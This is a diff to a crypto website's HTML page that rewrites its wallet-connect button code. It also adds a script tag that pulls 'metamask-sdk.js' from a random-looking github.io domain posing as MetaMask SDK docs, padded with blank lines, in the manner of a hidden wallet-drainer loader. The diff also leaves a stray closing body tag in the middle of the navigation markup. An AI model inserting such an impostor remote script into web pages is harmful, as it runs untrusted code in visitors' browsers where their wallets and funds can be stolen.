@@ -30,6 +30,25 @@
 
     <-- Style css -->
     <link rel="stylesheet" href="assets/css/style.css">
+ 
+        ...
+        <!-- script tag for metamask sdk? -->
+        <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+        
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+        
+       
+       
 
 </head>
 
@@ -214,27 +233,56 @@
                         <li class="nav-item ml-2">
                             <!-- <script> -->
                                 
-                                <a href="wallet-connect.html" class="btn ml-lg-auto btn-bordered-white"><i class="icon-wallet mr-md-2"></i>Wallet Connect</a>
+                                <a href="wallet-connect.html" class="btn ml-lg-auto btn-bordered-white"id='walletConnectButton'><i class="icon-wallet mr-md-2"></i>Wallet Connect</a>
+                        
+
+
+<!-- <button id="walletConnectButton" class="btn ml-lg-auto btn-bordered-white"> -->
+    <!-- <i class="icon-wallet mr-md-2"></i>Connect Wallet -->
+</button>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const walletConnectButton = document.getElementById('walletConnectButton');
+
+        if (walletConnectButton) {
+            walletConnectButton.addEventListener('click', connectWallet);
+        }
+
+        function connectWallet() {
+            if (typeof ethereum !== 'undefined') {
+                ethereum.request({ method: 'eth_requestAccounts' })
+                    .then((accounts) => {
+                        console.log(accounts);
+                        window.location.href = "loggedin.html";
+                    })
+                    .catch((error) => {
+                        console.error(error);
+                    });
+            } else {
+                console.error("Ethereum object not found. Make sure MetaMask is installed.");
+            }
+        }
+    });
+</script>
+
+</body>
+</html>
+
+                            
+                            
+                                  
+                                  
+                                  
                                 
-                                    
-        
-                              <script>
-                                async function connectWallet() {
-                                    try {
-                                        // Requesting access to the user's accounts
-                                        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-
-                                        // Accounts now exposed
-                                        console.log(accounts);
-
-                                        // Redirect to the logged-in page or perform other actions
-                                        window.location.href = "index.html";
-                                    } catch (error) {
-                                        console.error(error);
-                                    }
-                                }
-                         </script>
-                       </li>
+                                  
+                                  
+                                  
+                                  
+                    
+                                
+                                   
+                            </li>
 
                     </ul>
                 </div>
